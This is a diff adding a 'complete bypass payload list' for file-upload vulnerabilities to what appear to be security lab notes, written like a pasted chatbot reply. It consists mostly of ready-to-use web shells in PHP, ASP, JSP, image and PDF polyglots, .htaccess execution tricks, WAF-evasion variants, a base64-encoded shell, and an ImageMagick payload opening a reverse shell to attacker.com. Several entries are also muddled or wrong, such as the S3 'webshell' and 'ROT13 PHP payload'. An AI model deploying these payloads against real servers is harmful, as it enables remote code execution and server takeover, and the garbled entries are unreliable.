@@ -649,4 +649,398 @@ MzrfsTWgFr82UcKq9wFC0hObV7YSVmlq
 
 ![img](images/1%20-%20Web%20shell%20upload%20via%20extension%20blacklist%20bypass/7.png)
 
+Below is the **File Upload Vulnerabilities – Complete Bypass Payload List**, in the **same full format** you requested for OAuth, Host Header, SSRF, XXE, SSTI, Command Injection, etc.
+
+This includes **real malicious payloads**, **filter bypasses**, **content-type manipulation**, **polyglots**, **double extensions**, **null-byte tricks**, **advanced webshell payloads**, and **storage-level bypasses**.
+
+---
+
+# ⭐ **File Upload Vulnerabilities – Complete Bypass Payload List**
+
+*(For Pentesting, Red Teaming, Bug Hunting)*
+
+---
+
+# **1. File Extension Bypass Techniques**
+
+### **Double Extension Payloads**
+
+```
+shell.php.jpg
+exploit.asp;.jpg
+backdoor.pHp
+rev.PHP5
+```
+
+### **Case Manipulation**
+
+```
+SHELL.PhP
+index.PHp3
+```
+
+### **Whitelist Bypass**
+
+```
+style.css.php
+avatar.png.phps
+```
+
+### **Unicode Bypass**
+
+```
+shell.php%00.png
+shell.php;.jpg
+```
+
+---
+
+# **2. MIME Type Bypass Techniques**
+
+### **Fake Content-Type Headers**
+
+```
+Content-Type: image/png
+Content-Type: image/jpeg
+Content-Type: application/octet-stream
+```
+
+### **Real Payload + Fake Magic Bytes**
+
+```
+\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
+```
+
+### **Polyglot Files**
+
+(Works as image + executable)
+
+```
+GIF89a; <?php echo shell_exec($_GET['cmd']); ?>
+```
+
+---
+
+# **3. Directory / Storage Based Bypasses**
+
+### **Full Path Upload Override**
+
+```
+PUT /uploads/../shell.php
+```
+
+### **S3 / Cloud Storage Overwrite**
+
+```
+upload to s3://bucket/public/shell.php
+```
+
+### **Overwriting Application Files**
+
+```
+upload → /var/www/html/.htaccess
+```
+
+---
+
+# **4. Web Server Parsing Confusion Bypasses**
+
+### **Apache**
+
+```
+shell.php.jpg
+shell.php%00.jpg
+```
+
+### **Nginx (multi-extension)**
+
+```
+shell.php;.jpg
+```
+
+### **IIS**
+
+```
+cmd.asp;.png
+shell.aspx%00.jpg
+```
+
+---
+
+# **5. Payloads for Executable Web Shells**
+
+### **PHP Webshell**
+
+```
+<?php system($_GET['cmd']); ?>
+```
+
+### **PHP One-liner**
+
+```
+<?=`$_GET[x]`?>
+```
+
+### **Asp.NET Webshell**
+
+```
+<% Execute(Request("cmd")) %>
+```
+
+### **Node.js Injected Payload (if parsed)**
+
+```js
+{"name":"test","__proto__":{"toString":"require('child_process').execSync('id')"}}
+```
+
+### **JSP Webshell**
+
+```
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
+---
+
+# **6. Advanced Polyglot Payloads**
+
+### **JPG + PHP Polyglot**
+
+```
+ÿØÿà... (JPG header)
+<?php system($_GET['cmd']); ?>
+```
+
+### **PDF + PHP Polyglot**
+
+```
+%PDF-1.7
+<?php echo eval($_POST['x']); ?>
+```
+
+### **GIF Polyglot**
+
+```
+GIF89a;
+<?php echo shell_exec('id'); ?>
+```
+
+---
+
+# **7. HTAccess Upload Bypasses**
+
+### **Enable PHP Execution in Uploads Directory**
+
+```
+# .htaccess
+AddType application/x-httpd-php .jpg
+AddHandler application/x-httpd-php .jpg
+```
+
+### **Changing Directory behavior**
+
+```
+Options +Indexes
+```
+
+### **Trigger Server Side Script Execution**
+
+```
+php_flag engine on
+```
+
+---
+
+# **8. Client-Side Validation Bypass**
+
+### **Disable JS Validation**
+
+```
+Intercept → Remove “.jpg only” JS checks
+```
+
+### **Tamper Content-Type via Burp**
+
+```
+Content-Type: application/x-php
+```
+
+### **Modify Hidden Input Fields**
+
+```
+<input type="hidden" name="fileType" value="image/png">
+```
+
+---
+
+# **9. ImageTragick Bypass (ImageMagick)**
+
+*(If application uses convert/identify on uploaded images)*
+
+### **RCE Payload (ImageMagick)**
+
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://attacker.com/exploit.svg|bash -i >& /dev/tcp/attacker.com/4444 0>&1)'
+pop graphic-context
+```
+
+### **SVG RCE**
+
+```xml
+<image xlink:href="|ls -la" />
+```
+
+---
+
+# **10. PDF Upload → RCE Payloads**
+
+### **PDF with Embedded JS**
+
+```
+/JavaScript (app.launchURL("http://attacker.com"))
+```
+
+### **Embedded File Extraction**
+
+```
+/EmbeddedFile << /Subtype /application/x-httpd-php >>
+```
+
+---
+
+# **11. Archive Upload Bypass**
+
+### **Zip Slip (Directory Traversal in ZIP)**
+
+```
+../../../../../../var/www/html/shell.php
+```
+
+### **RAR And TAR Bypass**
+
+```
+shell.php in /var/www/html/uploads
+```
+
+### **Zip Bomb**
+
+```
+42.zip
+```
+
+---
+
+# **12. File Upload → LFI/RFI Chaining**
+
+If the file can’t execute directly, combine with LFI:
+
+### **Call Uploaded Shell**
+
+```
+/page.php?file=uploads/shell.php
+```
+
+---
+
+# **13. Payload Obfuscation / Encoding**
+
+### **Base64 Payload**
+
+```
+PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+```
+
+### **ROT13 PHP Payload**
+
+```
+<?cevag(fghss)?>
+```
+
+### **Mixed Comments Obfuscation**
+
+```
+<?php /* */ system /* */ ($_GET["cmd"]); ?>
+```
+
+---
+
+# **14. WAF Bypass Payloads**
+
+### **Space Obfuscation**
+
+```
+<?php%20system($_GET['cmd']);?>
+```
+
+### **Tabs / Newlines**
+
+```
+<?php
+system
+($_GET['cmd']);
+?>
+```
+
+### **Filtered keyword bypass**
+
+```
+<?php ecHo shell_exec($_GET['cmd']); ?>
+```
+
+---
+
+# **15. Content-Type Spoofing Payloads**
+
+### **Hidden MIME**
+
+```
+Content-Type: application/x-msdownload
+```
+
+### **Multipart Abuse**
+
+```
+------xxx  
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/gif
+```
+
+---
+
+# **16. Mobile App Upload Bypass**
+
+### **Android File Upload Attack**
+
+Use ADB to force upload:
+
+```
+adb push shell.php /sdcard/Download
+```
+
+### **iOS Jailbreak Upload**
+
+Upload directly into app sandbox.
+
+---
+
+# **17. Cloud Upload Bypasses (S3, Azure, GCP)**
+
+### **ACL Misconfig**
+
+```
+upload shell.php → publicly accessible bucket
+```
+
+### **S3 Webshell**
+
+```
+https://bucket.s3.amazonaws.com/shell.php
+```
+
+### **GCP Signed URL Abuse**
+
+Upload executable via signed URL.
+
+---
 
